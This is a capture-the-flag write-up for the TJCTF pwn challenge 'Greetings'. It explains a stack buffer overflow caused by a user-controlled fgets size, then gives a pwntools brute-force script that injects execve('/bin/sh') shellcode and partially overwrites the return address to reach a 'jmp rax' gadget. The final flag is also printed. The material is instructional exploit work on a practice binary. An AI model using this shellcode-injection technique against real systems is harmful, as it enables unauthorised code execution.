# Greetings

## 1. Summary

- **Category**: Pwn
- **Points**: 326
- **Solves**: 205

### Description

> `Greetings from TJ to you. Find the exploit, yes please do.`

## 2. Analysis

### Checksec

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

The stack is executable, so shellcode injection is possible.

### Vulnerability

```c
void greetUser() {
 int uname_size;
 char uname[64];

 printf("Enter the size of your username: ");
 scanf("%d", &uname_size);
 getchar();

 uname_size += 2;

 printf("Enter username (start with @): ");
 fgets(uname, uname_size, stdin);

 if (*(char *) uname == '@') {
  printf("Greetings to you: %s!", uname);
 }
}
```

The program allows us to control the size passed to `fgets`, resulting in a stack-based buffer overflow on `uname`.

Although the stack is executable, PIE is enabled, so we do not know the exact stack address beforehand. Instead of returning directly to shellcode, we can use a gadget already present in the binary.

At the return point after `fgets`, the return value is stored in `RAX`, which contains the buffer address on success:

```text
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffd153fa770  →  0x0000000000000a41 ("A\n"?)
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x60c094a491d5 <greetUser+0055> call   0x60c094a49040 <fgets@plt>
 → 0x60c094a491da <greetUser+005a> cmp    BYTE PTR [rsp+0x10], 0x40
```

The binary also contains the following gadget:

```text
0x00000000000010df: jmp rax;
```

By partially overwriting the saved return address, we can redirect execution to `jmp rax`, which jumps directly to our shellcode stored in `uname`.

Since the original return address already points inside the PIE binary, only the lower bytes need to be modified. However, `fgets` automatically appends a NULL byte at the end of the input, meaning the overwrite effectively becomes `0x00df`. As a result, a 1/16 brute-force is required due to PIE alignment.

## 3. Exploit Flow

1. **Partial Return Address Overwrite**

```python
while True:
    r = get_stream()

    shellcode = asm("""
        xor esi, esi
        push rsi
        mov rbx, 0x68732f2f6e69622f
        push rbx
        push rsp
        pop rdi
        imul esi
        mov al, 0x3b
        syscall
    """)

    try:
        payload = shellcode.ljust(0x48, b"\x90")
        payload += b"\xdf"

        send(r, f"{len(payload) - 1}".encode())
        send(r, payload)

        r.sendline(b"echo PWNED")
        res = r.recv(timeout=0.5)

        if b"PWNED" in res:
            r.interactive()
            break
        else:
            r.close()
```

The exploit places shellcode on the executable stack and partially overwrites the saved return address with `0xdf`, redirecting execution to the `jmp rax` gadget.

Because `RAX` contains the address of the input buffer returned by `fgets`, execution jumps directly into the injected shellcode.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Flag

`tjctf{rAx_h01ds_r3t_v@lS?_189278}`
